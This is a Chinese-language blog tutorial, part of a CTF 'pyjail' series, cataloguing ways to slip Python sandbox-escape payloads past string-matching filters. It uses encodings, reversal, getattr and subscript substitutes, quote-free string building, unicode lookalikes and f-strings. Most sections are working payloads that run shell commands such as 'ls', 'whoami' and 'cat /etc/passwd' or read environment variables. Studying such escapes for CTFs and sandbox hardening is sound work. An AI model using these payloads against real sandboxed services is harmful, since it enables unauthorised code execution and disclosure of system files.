---
title: pyjail bypass-02 绕过基于字符串匹配的过滤
date: 2023-05-30 10:23:57
categories:
- Python
tags:
- pyjail
image:
  path: /assets/images/pyjail.jpg
toc: true
---
> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理/)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制/)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制/)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制/)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改/)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook/)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱/)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制/)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱/)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈/)

## 绕过基于字符串匹配的过滤

### 字符串变换

#### 字符串拼接
在我们的 payload 中，例如如下的 payload，`__builtins__` `file` 这些字符串如果被过滤了，就可以使用字符串变换的方式进行绕过。
```py
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['fi'+'le']('E:/passwd').read()
```
当然，如果过滤的是 `__class__` 或者 `__mro__` 这样的属性名，就无法采用变形来绕过了。

#### base64 变形
base64 也可以运用到其中
```py
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')
0
```

#### 逆序
```py
>>> eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
kali
>>> exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
kali
```
注意 exec 与 eval 在执行上有所差异。

#### 进制转换
八进制：
```py
exec("print('RCE'); __import__('os').system('ls')")
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
```

exp:
```py
s = "eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])"
octal_string = "".join([f"\\{oct(ord(c))[2:]}" for c in s])
print(octal_string)
```

十六进制：
```py
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
```

exp:
```py
s = "eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))"
octal_string = "".join([f"\\x{hex(ord(c))[2:]}" for c in s])
print(octal_string)
```

#### 其他编码
hex、rot13、base32 等。


### 过滤了属性名或者函数名
在 payload 的构造中，我们大量的使用了各种类中的属性，例如 `__class__`、`__import__` 等。
#### getattr 函数
getattr 是 Python 的内置函数，用于获取一个对象的属性或者方法。其语法如下：

```python
getattr(object, name[, default])
```
这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。

```py
>>> getattr({},'__class__')
<class 'dict'>
>>> getattr(os,'system')
<built-in function system>
>>> getattr(os,'system')('cat /etc/passwd')
root:x:0:0:root:/root:/usr/bin/zsh
>>> getattr(os,'system111',os.system)('cat /etc/passwd')
root:x:0:0:root:/root:/usr/bin/zsh
```
这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。

#### `__getattribute__` 函数
`__getattribute__` 于，它定义了当我们尝试获取一个对象的属性时应该进行的操作。

它的基本语法如下：

```python
class MyClass:
    def __getattribute__(self, name):
```
getattr 函数在调用时，实际上就是调用这个类的 `__getattribute__` 方法。
```py
>>> os.__getattribute__
<method-wrapper '__getattribute__' of module object at 0x7f06a9bf44f0>
>>> os.__getattribute__('system')
<built-in function system>
```

#### `__getattr__` 函数
`__getattr__` 是 Python 的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个 `AttributeError` 异常。

如下是 `__getattr__` 方法的基本形式：

```python
class MyClass:
    def __getattr__(self, name):
        return 'You tried to get ' + name
```

在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 "You tried to get X"，其中 X 是你尝试访问的属性名。

与 `__getattribute__` 不同，`__getattr__` 只有在属性查找失败时才会被调用，这使得 `__getattribute__` 可以用来更为全面地控制属性访问。

如果在一个类中同时定义了 `__getattr__` 和 `__getattribute__`，那么无论属性是否存在，`__getattribute__` 都会被首先调用。只有当 `__getattribute__` 抛出 `AttributeError` 异常时，`__getattr__` 才会被调用。

另外，所有的类都会有`__getattribute__`属性，而不一定有`__getattr__`属性。


#### `__globals__` 替换
`__globals__` 可以用 func_globals 直接替换；

```py
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals
''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")
```

#### `__mro__`、`__bases__`、`__base__`互换

三者之间可以相互替换
```py
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__
```



### 过滤 import
python 中除了可以使用 import 来导入，还可以使用 `__import__` 和 `importlib.import_module` 来导入模块

#### `__import__`
```py
__import__('os')
```
#### importlib.import_module
不过 importlib 也需要导入,所以有些鸡肋.
```py
import importlib
importlib.import_module('os').system('ls')
```
注意：importlib 需要进行导入之后才能够使用

#### `__loader__.load_module`
如果使用 audithook 的方式进行过滤,上面的两种方法就无法使用了,但是 `__loader__.load_module` 底层实现与 import 不同, 因此某些情况下可以绕过.
```py
>>> __loader__.load_module('os')
<module 'os' (built-in)>
```


### 过滤了 []
如果中括号被过滤了，则可以使用如下的两种方式来绕过：

1. 调用`__getitem__()`函数直接替换；
2. 调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；

```py
''.__class__.__mro__[-1].__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

# __getitem__()替换中括号[]
''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('ls')

# pop()替换中括号[]，结合__getitem__()利用
''.__class__.__mro__.__getitem__(-1).__subclasses__().pop(200).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('ls')

getattr(''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__,'__builtins__').__getitem__('__import__')('os').system('ls')
```

### 过滤了 ''

#### str 函数
如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str() 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。

```py
>>> ().__class__.__new__
<built-in method __new__ of type object at 0x9597e0>
>>> str(().__class__.__new__)
'<built-in method __new__ of type object at 0x9597e0>'
>>> str(().__class__.__new__)[21]
'w'
>>> str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]
'whoami'
```

#### chr 函数
也可以使用 chr 加数字来构造字符串
```py
>>> chr(56)
'8'
>>> chr(100)
'd'
>>> chr(100)*40
'dddddddddddddddddddddddddddddddddddddddd'
```

#### list + dict 构造任意字符串
使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。
```py
list(dict(whoami=1))[0]
```
#### `__doc__`
`__doc__` 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：
```py
().__doc__.find('s')
().__doc__[19]+().__doc__[86]+().__doc__[19]
```


#### bytes 函数
bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串
```py
bytes([115, 121, 115, 116, 101, 109]).decode()
```

### 过滤了 +
过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 join 函数，初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 `__doc__` 中取，
```py
str().join(().__doc__[19],().__doc__[23])
```

### 过滤了数字
如果过滤了数字的话，可以使用一些函数的返回值获取。例如：
0：`int(bool([]))`、`Flase`、`len([])`、`any(())`
1：`int(bool([""]))`、`True`、`all(())`、`int(list(list(dict(a၁=())).pop()).pop())`

有了 0 之后，其他的数字可以通过运算进行获取：
```
0 ** 0 == 1
1 + 1 == 2
2 + 1 == 3
2 ** 2 == 4
```
当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。
```py
>>> len(repr(True))
4
>>> len(repr(bytearray))
19
```
第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现
```py
0 -> len([])
2 -> len(list(dict(aa=()))[len([])])
3 -> len(list(dict(aaa=()))[len([])])
```
第四种方法: unicode
会在后续的 unicode 绕过中介绍

### 过滤了空格
通过 ()、[] 替换

### 过滤了运算符
== 可以用 in 来替换

or 可以用| + -。。。-来替换

例如
```py
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] or i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans)
    print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)
```
and 可以用& *替代

例如
```py
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] and i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} & {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)
```

### 过滤了 ()

1. 利用装饰器 @
2. 利用魔术方法，例如 `enum.EnumMeta.__getitem__`

### f 字符串执行
f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如过去环境变量
```py
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```

也可以直接 RCE
```py
>>> f'{__import__("os").system("whoami")}'
kali
'0'
>>> f"{__builtins__.__import__('os').__dict__['popen']('ls').read()}"
```


### 反序列化绕过


### 过滤了内建函数
#### eval + list + dict 构造
假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。
```py
>>> eval('str')
<class 'str'>
>>> eval('bool')
<class 'bool'>
>>> eval('st'+'r')
<class 'str'>
```
这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。
```py
>>> eval(list(dict(s_t_r=1))[0][::2])
<class 'str'>
```
这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数。如果某个模块已经被导入了，则也可以获取这个模块中的函数。


### 过滤了 . 和 ，如何获取函数
通常情况下，我们会通过点号来进行调用`__import__('binascii').a2b_base64`

或者通过 getattr 函数：`getattr(__import__('binascii'),'a2b_base64')` 

如果将 , 号和 . 都过滤了，则可以有如下的几种方式获取函数：
1. 内建函数可以使用`eval(list(dict(s_t_r=1))[0][::2])` 这样的方式获取。
2. 模块内的函数可以先使用 `__import__` 导入函数，然后使用 vars() j进行获取：
   ```py
   >>> vars(__import__('binascii'))['a2b_base64']
   <built-in function a2b_base64>
   ```

### unicode 绕过
Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。

```py
>>> eval == 𝘦val
True
```
相似 unicode 寻找网站：http://shapecatcher.com/
可以通过绘制的方式寻找相似字符

下面是 0-9,a-z 的 unicode 字符
```
𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗
𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 
𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 
```

下划线可以使用对应的全角字符进行替换：
```
＿
```
使用时注意第一个字符不能为全角，否则会报错：
```py
>>> print(_＿name_＿)
__main__
>>> print(＿＿name_＿)
  File "<stdin>", line 1
    print(＿＿name_＿)
          ^
SyntaxError: invalid character '＿' (U+FF3F)
```

**需要注意的是，某些 unicode 在遇到 lower() 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意。**

## 参考资料
- [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
- [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
- [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
- [python沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
- [Python沙箱逃逸的n种姿势](https://ctftime.org/writeup/28286)
- [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)